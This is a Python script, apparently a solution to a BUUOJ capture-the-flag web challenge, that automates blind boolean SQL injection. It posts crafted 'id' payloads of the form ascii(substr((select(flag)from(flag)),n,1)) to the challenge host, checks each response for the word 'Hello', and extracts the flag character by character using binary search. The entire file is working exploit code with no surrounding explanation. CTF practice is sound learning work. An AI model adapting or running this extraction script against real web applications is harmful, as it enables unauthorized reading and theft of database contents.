#!/usr/bin/python
# -*-coding:utf-8 -*-
import requests
import re


def flag_get(start, f, url):  # 确定start位的字符
    a = '1^(if((ascii(substr((select(flag)from(flag)),' + str(start) + ',1))=' + str(f) + '),0,1))'
    data = {'id': a}
    url = 'http://7e7eff2e-8eec-45a9-bc83-3af0a5df42c4.node4.buuoj.cn:81/'
    r = requests.post(url, data)
    s = r.text
    # print(s)
    if 'Hello' in s:
        return 1
    else:
        return 0


def flag_find(start, f, url):  # 确定
    a = '1^(if((ascii(substr((select(flag)from(flag)),' + str(start) + ',1))>' + str(f) + '),0,1))'
    data = {'id': a}
    url = 'http://7e7eff2e-8eec-45a9-bc83-3af0a5df42c4.node4.buuoj.cn:81/'
    r = requests.post(url, data)
    s = r.text
    # print(s)
    if 'Hello' in s:
        return 1
    else:
        return 0


if __name__ == '__main__':
    url = 'http://7e7eff2e-8eec-45a9-bc83-3af0a5df42c4.node4.buuoj.cn:81/'
    flag_kouhao = 125
    flag = ''
    num = 1  # 从第num位开始爆破
    while 1:
        start = 32  # ascii的起始范围（10进制）
        last = 126  # ascii的终止范围（10进制）
        mid = int((start + last) / 2)
        while 1:
            if (flag_get(num, flag_kouhao, url)):
                flag = flag + '}'
                print('flag     is    :' + flag)
                exit(1)
            print('strat is ' + str(start))
            print(' mid  is ' + str(mid))
            print('last  is ' + str(last))
            print('****************************************')

            if (flag_find(num, mid, url)):
                start = mid
                mid = int((start + last) / 2)
                if ((last - start) < 5):
                    break
            else:
                last = mid
                mid = int((start + last) / 2)
                if ((last - start) < 5):
                    break
        print(start)
        print(last)
        print('****************************************')
        for i in range(start, last + 1):
            print(i)
            if (flag_get(num, i, url)):
                f = chr(i)
                flag = flag + f
                print('****************************************')
                print(' num is ' + str(num))
                print('char is ' + f)
                print('flag is ' + flag)
                print('****************************************')
                break
        num = num + 1
    print(flag)